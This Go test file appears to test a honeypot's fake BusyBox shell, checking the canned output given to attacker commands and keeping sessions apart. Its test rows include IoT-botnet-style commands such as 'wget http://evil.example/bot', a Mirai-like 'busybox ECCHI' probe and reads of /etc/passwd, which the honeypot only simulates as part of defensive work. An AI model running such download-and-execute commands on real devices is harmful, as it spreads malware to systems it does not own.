package vfs

import "testing"

// Each row = a line sent by the attacker + what must appear on screen.
func TestRun(t *testing.T) {
	tests := []struct {
		line string
		want string
	}{
		{"whoami", "root\n"},
		{"uname -m", "armv7l\n"},
		{"cd /tmp; pwd", "/tmp\n"},
		{"cd /tmp/../etc && pwd", "/etc\n"},
		{"cd /missing || cd /var/run; pwd", "-sh: cd: can't cd to /missing: No such file or directory\n/var/run\n"},
		{"cd /missing 2>/dev/null || cd /var/run; pwd", "/var/run\n"},
		{"cat /etc/passwd | grep admin", "admin:x:0:0:admin:/root:/bin/ash\n"}, // admin has uid 0 (still root)
		{"cat /proc/cpuinfo | grep 'model name'", "model name\t: ARMv7 Processor rev 5 (v7l)\n"},
		{`echo -e '\x6b\x61\x6d\x69'`, "kami\n"},
		{`echo "a; b" && echo c`, "a; b\nc\n"},
		{"echo -n done", "done"},
		{"/bin/busybox ECCHI", "ECCHI: applet not found\n"},
		{"busybox echo hello", "hello\n"},
		{"wget http://evil.example/bot && echo never-printed", "wget: can't connect to remote host: Connection timed out\n"},
		{"ls /var", "log  run  tmp\n"},
		{"cd /tmp; touch a; mkdir b; ls", "a  b\n"},
		{"echo kami > /tmp/.x; cat /tmp/.x; rm /tmp/.x; cat /tmp/.x", "kami\ncat: can't open '/tmp/.x': No such file or directory\n"},
		{"echo one > f; echo two >> f; cat f", "one\ntwo\n"},
		{"echo hi > /missing/file", "-sh: can't create /missing/file: nonexistent directory\n"},
		{"cd /tmp; wget http://x/bot -O - > bot; cat bot; ls", "wget: can't connect to remote host: Connection timed out\nbot\n"},
		{"cat /missing > f 2>/dev/null; ls", "f\n"},
		{"cat /tmp", "cat: read error: Is a directory\n"},
		{"./bot", "-sh: ./bot: not found\n"},
		{"cd /tmp; cp /bin/busybox x; ./x && echo started", "started\n"},
		{"ls /etc", "hostname  hosts  passwd  resolv.conf  shadow\n"},
		{"", ""},
		{";;", ""},
	}

	for _, tt := range tests {
		got, _ := NewShell().Run(tt.line)
		if got != tt.want {
			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
		}
	}
}

// exit ends the session: nothing after it runs.
func TestExit(t *testing.T) {
	out, exit := NewShell().Run("echo bye; exit; echo never-printed")
	if out != "bye\n" || !exit {
		t.Errorf("got %q, exit=%v", out, exit)
	}
}

// The prompt follows the current directory.
func TestPrompt(t *testing.T) {
	sh := NewShell()
	if p := sh.Prompt(); p != "root@gateway:~# " {
		t.Errorf("prompt at start: %q", p)
	}
	sh.Run("cd /tmp")
	if p := sh.Prompt(); p != "root@gateway:/tmp# " {
		t.Errorf("prompt after cd /tmp: %q", p)
	}
}

// Two attackers must not see each other's files or current directory.
func TestSessionsAreSeparate(t *testing.T) {
	a := NewShell()
	b := NewShell()
	a.Run("cd /tmp; echo secret > x")

	if out, _ := b.Run("cat /tmp/x"); out != "cat: can't open '/tmp/x': No such file or directory\n" {
		t.Errorf("b sees a's file: %q", out)
	}
	if out, _ := b.Run("pwd"); out != "/root\n" {
		t.Errorf("b has a's directory: %q", out)
	}
}
